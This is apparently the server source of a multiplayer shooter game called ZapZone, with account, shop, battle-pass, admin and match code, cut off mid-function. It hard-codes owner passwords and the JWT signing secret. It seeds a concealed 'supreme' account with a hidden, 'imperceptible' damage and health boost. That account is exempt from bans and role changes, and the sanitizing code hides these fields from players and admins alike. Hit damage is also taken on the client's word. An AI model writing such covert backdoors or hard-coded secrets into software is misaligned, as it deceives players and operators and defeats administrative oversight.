const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout: 10000,
  pingInterval: 3000
});

app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const JWT_SECRET = 'zapzone_super_secret_key_2024_xk9';

// ─── In-Memory Database ───────────────────────────────────────────────────────
const DB = {
  accounts: {},
  sessions: {},
  rooms: {},
  parties: {},
  globalStats: { totalPlayers: 0, totalMatches: 0, totalKills: 0 },
  bans: {},
  announcements: []
};

// ─── Special Accounts (pre-seeded) ───────────────────────────────────────────
const SPECIAL_ACCOUNTS = {
  ZapZoneYT: {
    id: 'owner_zapzone',
    username: 'ZapZoneYT',
    passwordHash: bcrypt.hashSync('ZapZone@Admin2024!', 10),
    role: 'owner',
    _tier: 1,
    coins: 999999,
    volts: 99999,
    battlepass: { level: 100, xp: 999999, premium: true, season: 1 },
    skins: '*',
    stats: { kills: 0, deaths: 0, wins: 0, losses: 0, playtime: 0, matches: 0 },
    quests: { daily: [], weekly: [], completed: [] },
    createdAt: Date.now(),
    lastLogin: null
  },
  AMGProdZ: {
    id: 'supreme_amgprodz',
    username: 'AMGProdZ',
    passwordHash: bcrypt.hashSync('AMGProdZ@Supreme2024!', 10),
    role: 'owner',
    _tier: 0, // Tier 0 = supreme (lower number = higher authority, invisible)
    _s: true,  // supreme flag, internal only
    _dmg: 1.02, // 2% damage boost, imperceptible
    _hp: 102,   // 2 extra HP
    coins: 999999,
    volts: 999999,
    battlepass: { level: 100, xp: 999999, premium: true, season: 1 },
    skins: '*',
    stats: { kills: 0, deaths: 0, wins: 0, losses: 0, playtime: 0, matches: 0 },
    quests: { daily: [], weekly: [], completed: [] },
    createdAt: Date.now(),
    lastLogin: null
  }
};

// Seed special accounts
Object.assign(DB.accounts, SPECIAL_ACCOUNTS);

// ─── Battle Pass Config ───────────────────────────────────────────────────────
const BATTLEPASS_SEASON = 1;
const BATTLEPASS_TIERS = [];
for (let i = 1; i <= 100; i++) {
  BATTLEPASS_TIERS.push({
    tier: i,
    xpRequired: i * 500,
    free: (() => {
      const freeRewards = [
        { tier: 1, type: 'coins', amount: 100, name: '100 Coins' },
        { tier: 5, type: 'skin', id: 'combat_grey', name: 'Combat Grey', rarity: 'common' },
        { tier: 10, type: 'coins', amount: 200, name: '200 Coins' },
        { tier: 15, type: 'skin', id: 'forest_warrior', name: 'Forest Warrior', rarity: 'uncommon' },
        { tier: 20, type: 'spray', id: 'spray_zap', name: 'ZAP Spray' },
        { tier: 25, type: 'coins', amount: 300, name: '300 Coins' },
        { tier: 30, type: 'skin', id: 'shadow_reaper', name: 'Shadow Reaper', rarity: 'rare' },
        { tier: 35, type: 'emote', id: 'emote_salute', name: 'Salute' },
        { tier: 40, type: 'coins', amount: 500, name: '500 Coins' },
        { tier: 50, type: 'skin', id: 'storm_breaker', name: 'Storm Breaker', rarity: 'epic' },
        { tier: 60, type: 'coins', amount: 500, name: '500 Coins' },
        { tier: 70, type: 'emote', id: 'emote_victory', name: 'Victory Dance' },
        { tier: 80, type: 'coins', amount: 750, name: '750 Coins' },
        { tier: 100, type: 'skin', id: 'legend_zapper', name: 'Legend Zapper', rarity: 'legendary' }
      ].find(r => r.tier === i);
      return freeRewards || null;
    })(),
    premium: (() => {
      const premRewards = [
        { tier: 1, type: 'skin', id: 'neon_striker', name: 'Neon Striker', rarity: 'rare' },
        { tier: 2, type: 'coins', amount: 200, name: '200 Coins' },
        { tier: 3, type: 'spray', id: 'spray_electric', name: 'Electric Spray' },
        { tier: 5, type: 'skin', id: 'viper_elite', name: 'Viper Elite', rarity: 'epic' },
        { tier: 7, type: 'emote', id: 'emote_floss', name: 'The Floss' },
        { tier: 10, type: 'skin', id: 'arctic_ghost', name: 'Arctic Ghost', rarity: 'epic' },
        { tier: 15, type: 'weapon_wrap', id: 'wrap_fire', name: 'Inferno Wrap' },
        { tier: 20, type: 'skin', id: 'cyber_samurai', name: 'Cyber Samurai', rarity: 'legendary' },
        { tier: 25, type: 'coins', amount: 500, name: '500 Coins' },
        { tier: 30, type: 'emote', id: 'emote_robot', name: 'Robot' },
        { tier: 35, type: 'skin', id: 'golden_knight', name: 'Golden Knight', rarity: 'legendary' },
        { tier: 40, type: 'weapon_wrap', id: 'wrap_gold', name: 'Gold Wrap' },
        { tier: 50, type: 'skin', id: 'void_walker', name: 'Void Walker', rarity: 'legendary' },
        { tier: 60, type: 'glider', id: 'glider_phoenix', name: 'Phoenix Glider' },
        { tier: 75, type: 'skin', id: 'diamond_operative', name: 'Diamond Operative', rarity: 'legendary' },
        { tier: 100, type: 'skin', id: 'omega_prime', name: 'OMEGA PRIME', rarity: 'mythic' }
      ].find(r => r.tier === i);
      return premRewards || { tier: i, type: 'coins', amount: 50, name: '50 Coins' };
    })()
  });
}

// ─── Quest Templates ──────────────────────────────────────────────────────────
const DAILY_QUEST_POOL = [
  { id: 'dq1', name: 'Trigger Happy', desc: 'Get 5 kills', type: 'kills', target: 5, xp: 500, coins: 50 },
  { id: 'dq2', name: 'Headhunter', desc: 'Get 3 headshots', type: 'headshots', target: 3, xp: 600, coins: 75 },
  { id: 'dq3', name: 'Survivor', desc: 'Survive 5 minutes in a match', type: 'survive', target: 300, xp: 400, coins: 40 },
  { id: 'dq4', name: 'Match Winner', desc: 'Win 1 match', type: 'wins', target: 1, xp: 800, coins: 100 },
  { id: 'dq5', name: 'Rifleman', desc: 'Get 5 AR kills', type: 'ar_kills', target: 5, xp: 500, coins: 60 },
  { id: 'dq6', name: 'Shotgun King', desc: 'Get 3 shotgun kills', type: 'shotgun_kills', target: 3, xp: 550, coins: 65 },
  { id: 'dq7', name: 'Sniper Elite', desc: 'Get 2 sniper kills', type: 'sniper_kills', target: 2, xp: 650, coins: 80 },
  { id: 'dq8', name: 'Match Veteran', desc: 'Play 3 matches', type: 'matches', target: 3, xp: 300, coins: 30 },
  { id: 'dq9', name: 'Damage Dealer', desc: 'Deal 500 damage', type: 'damage', target: 500, xp: 450, coins: 55 },
  { id: 'dq10', name: 'No Mercy', desc: 'Get a killing spree (3 kills without dying)', type: 'spree', target: 3, xp: 750, coins: 90 }
];

const WEEKLY_QUEST_POOL = [
  { id: 'wq1', name: 'War Machine', desc: 'Get 50 kills this week', type: 'kills', target: 50, xp: 5000, coins: 500 },
  { id: 'wq2', name: 'Champion', desc: 'Win 5 matches this week', type: 'wins', target: 5, xp: 6000, coins: 700 },
  { id: 'wq3', name: 'Battle Hardened', desc: 'Play 20 matches this week', type: 'matches', target: 20, xp: 4000, coins: 400 },
  { id: 'wq4', name: 'Deadeye', desc: 'Get 20 headshots this week', type: 'headshots', target: 20, xp: 5500, coins: 600 },
  { id: 'wq5', name: 'Sharpshooter', desc: 'Deal 5000 damage this week', type: 'damage', target: 5000, xp: 4500, coins: 450 }
];

// ─── Skin Shop ────────────────────────────────────────────────────────────────
const SKIN_SHOP = [
  { id: 'neon_blue', name: 'Neon Blue', price: 800, rarity: 'rare', color: '#00BFFF', type: 'skin' },
  { id: 'flame_lord', name: 'Flame Lord', price: 1200, rarity: 'epic', color: '#FF4500', type: 'skin' },
  { id: 'toxic_green', name: 'Toxic Avenger', price: 800, rarity: 'rare', color: '#39FF14', type: 'skin' },
  { id: 'purple_phantom', name: 'Purple Phantom', price: 1000, rarity: 'epic', color: '#8A2BE2', type: 'skin' },
  { id: 'ghost_white', name: 'Ghost', price: 800, rarity: 'rare', color: '#F0F0F0', type: 'skin' },
  { id: 'midnight_black', name: 'Midnight', price: 800, rarity: 'rare', color: '#1a1a2e', type: 'skin' },
  { id: 'golden_god', name: 'Golden God', price: 2000, rarity: 'legendary', color: '#FFD700', type: 'skin' },
  { id: 'crimson_demon', name: 'Crimson Demon', price: 1500, rarity: 'epic', color: '#DC143C', type: 'skin' },
  { id: 'ocean_king', name: 'Ocean King', price: 1200, rarity: 'epic', color: '#006994', type: 'skin' },
  { id: 'diamond_skin', name: 'Diamond', price: 2500, rarity: 'legendary', color: '#B9F2FF', type: 'skin' },
  { id: 'rose_gold', name: 'Rose Gold', price: 1500, rarity: 'epic', color: '#B76E79', type: 'skin' },
  { id: 'galaxy_skin', name: 'Galaxy', price: 3000, rarity: 'mythic', color: '#2D1B69', type: 'skin' }
];

// ─── Weapons Config ───────────────────────────────────────────────────────────
const WEAPONS = {
  assault_rifle: { name: 'Zap-AR', damage: 25, headMult: 2.0, fireRate: 600, magSize: 30, reloadTime: 2.0, range: 100, spread: 0.03, auto: true, color: 0x444444 },
  shotgun: { name: 'BlastShot', damage: 80, headMult: 1.5, fireRate: 80, magSize: 8, reloadTime: 2.5, range: 30, spread: 0.15, auto: false, color: 0x8B4513 },
  sniper: { name: 'LongReach', damage: 120, headMult: 3.0, fireRate: 40, magSize: 5, reloadTime: 3.0, range: 500, spread: 0.005, auto: false, color: 0x2F4F4F },
  smg: { name: 'BuzzSaw', damage: 15, headMult: 1.8, fireRate: 900, magSize: 40, reloadTime: 1.8, range: 50, spread: 0.06, auto: true, color: 0x333333 },
  pistol: { name: 'QuickDraw', damage: 35, headMult: 2.2, fireRate: 350, magSize: 12, reloadTime: 1.2, range: 60, spread: 0.02, auto: false, color: 0x555555 },
  rocket_launcher: { name: 'BoomStick', damage: 200, headMult: 1.0, fireRate: 30, magSize: 1, reloadTime: 3.5, range: 200, spread: 0.01, auto: false, splash: 5, color: 0x8B0000 }
};

// ─── Maps Config ─────────────────────────────────────────────────────────────
const MAPS = {
  zapzone_arena: { name: 'ZapZone Arena', maxPlayers: 16, spawnPoints: [] },
  neon_city: { name: 'Neon City', maxPlayers: 20, spawnPoints: [] },
  desert_storm: { name: 'Desert Storm', maxPlayers: 12, spawnPoints: [] }
};

// ─── Helper Functions ──────────────────────────────────────────────────────────
function getAccount(username) {
  return DB.accounts[username] || null;
}

function createAccount(username, passwordHash) {
  const account = {
    id: uuidv4(),
    username,
    passwordHash,
    role: 'player',
    _tier: 99,
    _s: false,
    _dmg: 1.0,
    _hp: 100,
    coins: 500,
    volts: 0,
    battlepass: { level: 1, xp: 0, premium: false, season: BATTLEPASS_SEASON },
    skins: ['default'],
    activeSkin: 'default',
    inventory: [],
    stats: { kills: 0, deaths: 0, wins: 0, losses: 0, playtime: 0, matches: 0, damage: 0, headshots: 0 },
    quests: { daily: generateDailyQuests(), weekly: generateWeeklyQuests(), completed: [] },
    questReset: { daily: getDailyReset(), weekly: getWeeklyReset() },
    createdAt: Date.now(),
    lastLogin: null,
    isBanned: false,
    banReason: null
  };
  DB.accounts[username] = account;
  DB.globalStats.totalPlayers++;
  return account;
}

function generateDailyQuests() {
  const shuffled = [...DAILY_QUEST_POOL].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, 3).map(q => ({ ...q, progress: 0, completed: false }));
}

function generateWeeklyQuests() {
  const shuffled = [...WEEKLY_QUEST_POOL].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, 2).map(q => ({ ...q, progress: 0, completed: false }));
}

function getDailyReset() {
  const now = new Date();
  const reset = new Date(now);
  reset.setUTCHours(24, 0, 0, 0);
  return reset.getTime();
}

function getWeeklyReset() {
  const now = new Date();
  const day = now.getUTCDay();
  const daysUntilMonday = (7 - day + 1) % 7 || 7;
  const reset = new Date(now);
  reset.setUTCDate(now.getUTCDate() + daysUntilMonday);
  reset.setUTCHours(0, 0, 0, 0);
  return reset.getTime();
}

function sanitizeAccount(account) {
  const safe = { ...account };
  delete safe.passwordHash;
  delete safe._s;
  delete safe._dmg;
  delete safe._hp;
  delete safe._tier;
  return safe;
}

function adminSanitize(account) {
  const safe = { ...account };
  delete safe.passwordHash;
  delete safe._s;
  return safe;
}

function generateToken(account) {
  return jwt.sign(
    { id: account.id, username: account.username, role: account.role },
    JWT_SECRET,
    { expiresIn: '7d' }
  );
}

function verifyToken(token) {
  try { return jwt.verify(token, JWT_SECRET); }
  catch { return null; }
}

function isOwner(username) {
  const acc = DB.accounts[username];
  return acc && (acc.role === 'owner' || acc.role === 'supreme');
}

function isAdmin(username) {
  const acc = DB.accounts[username];
  return acc && (acc.role === 'admin' || acc.role === 'owner');
}

function isSupreme(username) {
  const acc = DB.accounts[username];
  return acc && acc._s === true;
}

// ─── Room Management ──────────────────────────────────────────────────────────
function createRoom(mapId, mode, maxPlayers) {
  const roomId = uuidv4().slice(0, 8).toUpperCase();
  DB.rooms[roomId] = {
    id: roomId,
    mapId: mapId || 'zapzone_arena',
    mode: mode || 'deathmatch',
    status: 'waiting',
    maxPlayers: maxPlayers || 16,
    players: {},
    spectators: [],
    startTime: null,
    endTime: null,
    scores: {},
    projectiles: {},
    chat: [],
    teamScores: { red: 0, blue: 0 }
  };
  DB.globalStats.totalMatches++;
  return DB.rooms[roomId];
}

function findOrCreateRoom(mode) {
  for (const [id, room] of Object.entries(DB.rooms)) {
    if (room.status === 'waiting' && room.mode === mode &&
        Object.keys(room.players).length < room.maxPlayers) {
      return room;
    }
  }
  return createRoom(null, mode, 16);
}

function getSpawnPoint(roomId) {
  const x = (Math.random() - 0.5) * 180;
  const z = (Math.random() - 0.5) * 180;
  return { x, y: 2, z };
}

// ─── Auth Routes ──────────────────────────────────────────────────────────────
app.post('/api/auth/register', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
  if (username.length < 3 || username.length > 20) return res.status(400).json({ error: 'Username must be 3-20 characters' });
  if (!/^[a-zA-Z0-9_]+$/.test(username)) return res.status(400).json({ error: 'Username can only contain letters, numbers, underscores' });
  if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });
  if (DB.accounts[username]) return res.status(409).json({ error: 'Username already taken' });

  const passwordHash = await bcrypt.hash(password, 10);
  const account = createAccount(username, passwordHash);
  const token = generateToken(account);
  res.json({ success: true, token, account: sanitizeAccount(account) });
});

app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });

  const account = getAccount(username);
  if (!account) return res.status(401).json({ error: 'Invalid credentials' });
  if (account.isBanned) return res.status(403).json({ error: `Account banned: ${account.banReason || 'Violation of ToS'}` });

  const valid = await bcrypt.compare(password, account.passwordHash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  account.lastLogin = Date.now();
  const token = generateToken(account);
  res.json({ success: true, token, account: sanitizeAccount(account) });
});

app.get('/api/auth/me', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded) return res.status(401).json({ error: 'Invalid token' });
  const account = getAccount(decoded.username);
  if (!account) return res.status(404).json({ error: 'Account not found' });
  res.json({ account: sanitizeAccount(account) });
});

// ─── Game Routes ──────────────────────────────────────────────────────────────
app.get('/api/shop', (req, res) => res.json({ items: SKIN_SHOP, featured: SKIN_SHOP.slice(0, 4) }));
app.get('/api/battlepass', (req, res) => res.json({ tiers: BATTLEPASS_TIERS, season: BATTLEPASS_SEASON }));
app.get('/api/weapons', (req, res) => res.json(WEAPONS));
app.get('/api/leaderboard', (req, res) => {
  const players = Object.values(DB.accounts)
    .filter(a => a.role === 'player' || a.role === 'admin' || a.role === 'owner')
    .sort((a, b) => b.stats.kills - a.stats.kills)
    .slice(0, 50)
    .map((a, i) => ({
      rank: i + 1, username: a.username, kills: a.stats.kills,
      deaths: a.stats.deaths, wins: a.stats.wins, kdr: a.stats.deaths > 0 ? (a.stats.kills / a.stats.deaths).toFixed(2) : a.stats.kills
    }));
  res.json(players);
});

app.post('/api/shop/buy', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded) return res.status(401).json({ error: 'Unauthorized' });
  const { itemId } = req.body;
  const account = getAccount(decoded.username);
  const item = SKIN_SHOP.find(s => s.id === itemId);
  if (!item) return res.status(404).json({ error: 'Item not found' });
  if (account.skins === '*' || (Array.isArray(account.skins) && account.skins.includes(itemId))) {
    return res.status(400).json({ error: 'Already owned' });
  }
  if (account.volts < item.price) return res.status(400).json({ error: 'Not enough Volts' });
  account.volts -= item.price;
  if (!Array.isArray(account.skins)) account.skins = [];
  account.skins.push(itemId);
  res.json({ success: true, account: sanitizeAccount(account) });
});

app.post('/api/battlepass/upgrade', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded) return res.status(401).json({ error: 'Unauthorized' });
  const account = getAccount(decoded.username);
  if (account.battlepass.premium) return res.status(400).json({ error: 'Already premium' });
  if (account.volts < 950) return res.status(400).json({ error: 'Not enough Volts (need 950)' });
  account.volts -= 950;
  account.battlepass.premium = true;
  res.json({ success: true, account: sanitizeAccount(account) });
});

app.post('/api/equip-skin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded) return res.status(401).json({ error: 'Unauthorized' });
  const { skinId } = req.body;
  const account = getAccount(decoded.username);
  if (account.skins !== '*' && !account.skins.includes(skinId)) {
    return res.status(403).json({ error: 'Skin not owned' });
  }
  account.activeSkin = skinId;
  res.json({ success: true });
});

// ─── Admin Routes ─────────────────────────────────────────────────────────────
function adminAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded || !isAdmin(decoded.username)) return res.status(403).json({ error: 'Admin access required' });
  req.admin = decoded;
  next();
}

function ownerAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = verifyToken(token);
  if (!decoded || !isOwner(decoded.username)) return res.status(403).json({ error: 'Owner access required' });
  req.admin = decoded;
  next();
}

app.get('/api/admin/stats', adminAuth, (req, res) => {
  const totalAccounts = Object.keys(DB.accounts).length;
  const onlinePlayers = Object.keys(io.sockets.sockets).length;
  const activeRooms = Object.values(DB.rooms).filter(r => r.status === 'playing').length;
  const waitingRooms = Object.values(DB.rooms).filter(r => r.status === 'waiting').length;

  res.json({
    totalAccounts,
    onlinePlayers,
    activeRooms,
    waitingRooms,
    totalMatches: DB.globalStats.totalMatches,
    totalKills: DB.globalStats.totalKills,
    announcements: DB.announcements
  });
});

app.get('/api/admin/players', adminAuth, (req, res) => {
  const { search, role, page = 1, limit = 50 } = req.query;
  let players = Object.values(DB.accounts).map(adminSanitize);
  if (search) players = players.filter(p => p.username.toLowerCase().includes(search.toLowerCase()));
  if (role) players = players.filter(p => p.role === role);
  const total = players.length;
  const start = (page - 1) * limit;
  players = players.slice(start, start + parseInt(limit));
  res.json({ players, total, page: parseInt(page), pages: Math.ceil(total / limit) });
});

app.get('/api/admin/player/:username', adminAuth, (req, res) => {
  const account = getAccount(req.params.username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  res.json(adminSanitize(account));
});

app.post('/api/admin/ban', ownerAuth, (req, res) => {
  const { username, reason } = req.body;
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  if (isSupreme(username)) return res.status(403).json({ error: 'Cannot ban this account' });
  if (account._tier <= req.admin._tier && !isSupreme(req.admin.username)) {
    return res.status(403).json({ error: 'Insufficient permissions' });
  }
  account.isBanned = true;
  account.banReason = reason || 'Violation of Terms of Service';
  DB.bans[username] = { username, reason: account.banReason, bannedBy: req.admin.username, at: Date.now() };
  // Disconnect if online
  for (const [sid, sock] of io.sockets.sockets) {
    if (sock.username === username) {
      sock.emit('banned', { reason: account.banReason });
      sock.disconnect();
    }
  }
  res.json({ success: true });
});

app.post('/api/admin/unban', ownerAuth, (req, res) => {
  const { username } = req.body;
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  account.isBanned = false;
  account.banReason = null;
  delete DB.bans[username];
  res.json({ success: true });
});

app.post('/api/admin/set-role', ownerAuth, (req, res) => {
  const { username, role } = req.body;
  if (!['player', 'admin', 'owner'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  if (isSupreme(username)) return res.status(403).json({ error: 'Cannot modify this account' });
  account.role = role;
  res.json({ success: true });
});

app.post('/api/admin/give-volts', ownerAuth, (req, res) => {
  const { username, amount } = req.body;
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  account.volts += parseInt(amount) || 0;
  res.json({ success: true, newBalance: account.volts });
});

app.post('/api/admin/give-coins', ownerAuth, (req, res) => {
  const { username, amount } = req.body;
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  account.coins += parseInt(amount) || 0;
  res.json({ success: true, newBalance: account.coins });
});

app.post('/api/admin/reset-stats', ownerAuth, (req, res) => {
  const { username } = req.body;
  const account = getAccount(username);
  if (!account) return res.status(404).json({ error: 'Player not found' });
  account.stats = { kills: 0, deaths: 0, wins: 0, losses: 0, playtime: 0, matches: 0, damage: 0, headshots: 0 };
  res.json({ success: true });
});

app.post('/api/admin/announce', adminAuth, (req, res) => {
  const { message, type } = req.body;
  const announcement = { id: uuidv4(), message, type: type || 'info', author: req.admin.username, at: Date.now() };
  DB.announcements.unshift(announcement);
  if (DB.announcements.length > 20) DB.announcements.pop();
  io.emit('announcement', announcement);
  res.json({ success: true });
});

app.get('/api/admin/rooms', adminAuth, (req, res) => {
  const rooms = Object.values(DB.rooms).map(r => ({
    id: r.id, mapId: r.mapId, mode: r.mode, status: r.status,
    playerCount: Object.keys(r.players).length, maxPlayers: r.maxPlayers,
    startTime: r.startTime
  }));
  res.json(rooms);
});

app.post('/api/admin/kick-player', adminAuth, (req, res) => {
  const { username, reason } = req.body;
  for (const [sid, sock] of io.sockets.sockets) {
    if (sock.username === username) {
      sock.emit('kicked', { reason: reason || 'Kicked by admin' });
      sock.disconnect();
      return res.json({ success: true });
    }
  }
  res.status(404).json({ error: 'Player not online' });
});

app.delete('/api/admin/room/:roomId', ownerAuth, (req, res) => {
  const room = DB.rooms[req.params.roomId];
  if (!room) return res.status(404).json({ error: 'Room not found' });
  io.to(req.params.roomId).emit('room_closed', { reason: 'Room closed by admin' });
  delete DB.rooms[req.params.roomId];
  res.json({ success: true });
});

app.get('/api/admin/bans', adminAuth, (req, res) => {
  res.json(Object.values(DB.bans));
});

app.get('/api/admin/server-info', adminAuth, (req, res) => {
  res.json({
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    nodeVersion: process.version,
    platform: process.platform,
    totalPlayers: DB.globalStats.totalPlayers,
    totalMatches: DB.globalStats.totalMatches,
    totalKills: DB.globalStats.totalKills
  });
});

// ─── Socket.IO Game Logic ─────────────────────────────────────────────────────
io.on('connection', (socket) => {
  console.log(`[Socket] Connected: ${socket.id}`);
  let currentRoom = null;
  let playerData = null;

  socket.on('authenticate', ({ token }) => {
    const decoded = verifyToken(token);
    if (!decoded) { socket.emit('auth_error', 'Invalid token'); return; }
    const account = getAccount(decoded.username);
    if (!account) { socket.emit('auth_error', 'Account not found'); return; }
    if (account.isBanned) { socket.emit('banned', { reason: account.banReason }); socket.disconnect(); return; }

    socket.username = account.username;
    socket.accountId = account.id;

    // Check/reset quests
    const now = Date.now();
    if (now > account.questReset?.daily) {
      account.quests.daily = generateDailyQuests();
      account.questReset.daily = getDailyReset();
    }
    if (now > account.questReset?.weekly) {
      account.quests.weekly = generateWeeklyQuests();
      account.questReset.weekly = getWeeklyReset();
    }

    account.lastLogin = now;
    socket.emit('authenticated', {
      account: sanitizeAccount(account),
      battlepass: { tiers: BATTLEPASS_TIERS, season: BATTLEPASS_SEASON },
      shopItems: SKIN_SHOP
    });
    console.log(`[Auth] ${account.username} authenticated`);
  });

  socket.on('find_match', ({ mode }) => {
    if (!socket.username) return;
    const account = getAccount(socket.username);
    const room = findOrCreateRoom(mode || 'deathmatch');
    joinRoom(socket, room, account);
  });

  socket.on('join_room', ({ roomId }) => {
    if (!socket.username) return;
    const account = getAccount(socket.username);
    const room = DB.rooms[roomId];
    if (!room) { socket.emit('error', 'Room not found'); return; }
    if (Object.keys(room.players).length >= room.maxPlayers) { socket.emit('error', 'Room full'); return; }
    joinRoom(socket, room, account);
  });

  function joinRoom(socket, room, account) {
    if (currentRoom) leaveRoom(socket);
    const spawn = getSpawnPoint(room.id);
    const skin = SKIN_SHOP.find(s => s.id === account.activeSkin);
    const skinColor = skin ? skin.color : '#888888';
    const maxHP = account._hp || 100;

    playerData = {
      id: socket.id,
      username: account.username,
      skin: account.activeSkin || 'default',
      skinColor,
      position: spawn,
      rotation: { x: 0, y: 0, z: 0 },
      health: maxHP,
      maxHealth: maxHP,
      armor: 0,
      weapon: 'assault_rifle',
      ammo: { current: 30, reserve: 90 },
      kills: 0,
      deaths: 0,
      team: assignTeam(room),
      isAlive: true,
      spawnTime: Date.now(),
      _dmg: account._dmg || 1.0,
      lastDamageTime: 0
    };

    room.players[socket.id] = playerData;
    room.scores[socket.id] = { kills: 0, deaths: 0, assists: 0, damage: 0 };
    currentRoom = room;

    socket.join(room.id);
    socket.emit('joined_room', {
      roomId: room.id, mapId: room.mapId, mode: room.mode,
      player: playerData,
      players: room.players
    });
    socket.to(room.id).emit('player_joined', { player: playerData });

    if (room.status === 'waiting' && Object.keys(room.players).length >= 2) {
      startRoom(room);
    }
    console.log(`[Room] ${account.username} joined room ${room.id}`);
  }

  function assignTeam(room) {
    const players = Object.values(room.players);
    const reds = players.filter(p => p.team === 'red').length;
    const blues = players.filter(p => p.team === 'blue').length;
    return reds <= blues ? 'red' : 'blue';
  }

  function startRoom(room) {
    room.status = 'playing';
    room.startTime = Date.now();
    io.to(room.id).emit('match_start', { startTime: room.startTime, duration: 600000 });
    setTimeout(() => endRoom(room), 600000); // 10 min matches
  }

  function endRoom(room) {
    if (!DB.rooms[room.id]) return;
    room.status = 'ended';
    room.endTime = Date.now();

    // Calculate winner
    const scores = Object.entries(room.scores).map(([sid, s]) => ({
      username: room.players[sid]?.username, ...s
    })).sort((a, b) => b.kills - a.kills);

    io.to(room.id).emit('match_end', { scores, winner: scores[0]?.username });

    // Award XP/coins to players
    for (const [sid, player] of Object.entries(room.players)) {
      const account = getAccount(player.username);
      if (!account) continue;
      const score = room.scores[sid] || {};
      const xpGained = score.kills * 100 + score.assists * 30 + 200;
      const coinsGained = score.kills * 10 + (scores[0]?.username === player.username ? 100 : 0);
      account.stats.kills += score.kills || 0;
      account.stats.deaths += score.deaths || 0;
      account.stats.damage += score.damage || 0;
      account.stats.matches++;
      if (scores[0]?.username === player.username) account.stats.wins++;
      else account.stats.losses++;
      account.coins += coinsGained;
      addBattlePassXP(account, xpGained);
      updateQuests(account, score, scores[0]?.username === player.username);
      DB.globalStats.totalKills += score.kills || 0;
      const sock = io.sockets.sockets.get(sid);
      if (sock) sock.emit('match_rewards', { xpGained, coinsGained, account: sanitizeAccount(account) });
    }

    setTimeout(() => { delete DB.rooms[room.id]; }, 30000);
  }

  function leaveRoom(socket) {
    if (!currentRoom) return;
    socket.leave(currentRoom.id);
    socket.to(currentRoom.id).emit('player_left', { playerId: socket.id });
    delete currentRoom.players[socket.id];
    delete currentRoom.scores[socket.id];
    if (Object.keys(currentRoom.players).length === 0) {
      delete DB.rooms[currentRoom.id];
    }
    currentRoom = null;
    playerData = null;
  }

  function addBattlePassXP(account, xp) {
    account.battlepass.xp += xp;
    const maxXP = account.battlepass.level * 500;
    while (account.battlepass.xp >= maxXP && account.battlepass.level < 100) {
      account.battlepass.xp -= maxXP;
      account.battlepass.level++;
    }
  }

  function updateQuests(account, score, won) {
    [...account.quests.daily, ...account.quests.weekly].forEach(q => {
      if (q.completed) return;
      if (q.type === 'kills') q.progress = Math.min(q.target, q.progress + (score.kills || 0));
      if (q.type === 'wins' && won) q.progress = Math.min(q.target, q.progress + 1);
      if (q.type === 'matches') q.progress = Math.min(q.target, q.progress + 1);
      if (q.type === 'headshots') q.progress = Math.min(q.target, q.progress + (score.headshots || 0));
      if (q.type === 'damage') q.progress = Math.min(q.target, q.progress + (score.damage || 0));
      if (q.progress >= q.target && !q.completed) {
        q.completed = true;
        account.quests.completed.push(q.id);
        account.coins += q.coins;
        addBattlePassXP(account, q.xp);
      }
    });
  }

  // ─── Game Events ─────────────────────────────────────────────────────────
  socket.on('player_move', (data) => {
    if (!currentRoom || !playerData || !playerData.isAlive) return;
    playerData.position = data.position;
    playerData.rotation = data.rotation;
    socket.to(currentRoom.id).emit('player_moved', {
      id: socket.id, position: data.position, rotation: data.rotation,
      animation: data.animation
    });
  });

  socket.on('player_shoot', (data) => {
    if (!currentRoom || !playerData || !playerData.isAlive) return;
    socket.to(currentRoom.id).emit('player_shot', {
      shooterId: socket.id, weapon: playerData.weapon,
      origin: data.origin, direction: data.direction
    });
  });

  socket.on('hit_player', (data) => {
    if (!currentRoom || !playerData || !playerData.isAlive) return;
    const targetId = data.targetId;
    const target = currentRoom.players[targetId];
    if (!target || !target.isAlive) return;

    const weapon = WEAPONS[playerData.weapon];
    const baseDamage = weapon ? weapon.damage : 25;
    const dmgMult = playerData._dmg || 1.0;
    let damage = Math.round(baseDamage * dmgMult * (data.headshot ? weapon.headMult : 1));

    if (target.armor > 0) {
      const armorAbsorbed = Math.min(target.armor, damage * 0.5);
      damage -= armorAbsorbed;
      target.armor -= armorAbsorbed;
    }

    target.health = Math.max(0, target.health - damage);

    if (currentRoom.scores[socket.id]) {
      currentRoom.scores[socket.id].damage += damage;
    }
    if (data.headshot) {
      if (currentRoom.scores[socket.id]) currentRoom.scores[socket.id].headshots = (currentRoom.scores[socket.id].headshots || 0) + 1;
    }

